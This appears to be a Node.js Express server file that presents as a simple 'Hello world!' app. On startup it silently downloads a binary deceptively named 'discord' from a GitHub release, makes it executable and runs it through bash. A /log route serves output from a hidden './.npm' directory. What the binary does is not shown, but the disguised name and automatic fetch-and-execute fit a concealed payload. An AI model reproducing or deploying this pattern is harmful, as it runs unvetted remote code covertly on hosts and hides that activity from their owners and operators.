const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const FILE_PATH = './.npm';

// http
app.get("/", function(req, res) {
  res.send("Hello world!");
});

// log
app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const downloadDiscord = () => {
    return new Promise((resolve, reject) => {
      console.log('Start downloading discord...');
      const file = fs.createWriteStream('discord');
      https.get('https://github.com/mmnni/pipeops/releases/download/sac/discord', (response) => {
        if (response.statusCode !== 200) {
          console.log(`Download failed, status code: ${response.statusCode}`);
          reject(new Error(`Download failed: ${response.statusCode}`));
          return;
        }
  
        response.pipe(file);
        file.on('finish', () => {
          file.close();
          console.log('Download completed, adding execute permission...');
          exec('chmod +x discord', (err) => {
            if (err) {
              console.log('Failed to add execute permission:', err);
              reject(err);
            }
            console.log('Execute permission added successfully');
            resolve();
          });
        });
      }).on('error', (err) => {
        console.log('Download error:', err);
        fs.unlink('discord', () => {});
        reject(err);
      });
    });
  };
  
  const Execute = async () => {
    try {
      await downloadDiscord();
      
      console.log('Starting discord...');

      const command = './discord';
      exec(command, { 
        shell: '/bin/bash'
      }, (error, stdout, stderr) => {
        if (error) {
          console.log('Execution error:', error);
          return;
        }
        if (stdout) console.log('Output:', stdout);
        if (stderr) console.log('Error:', stderr);
      });
    } catch (err) {
      console.log('Process error:', err);
    }
  };

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
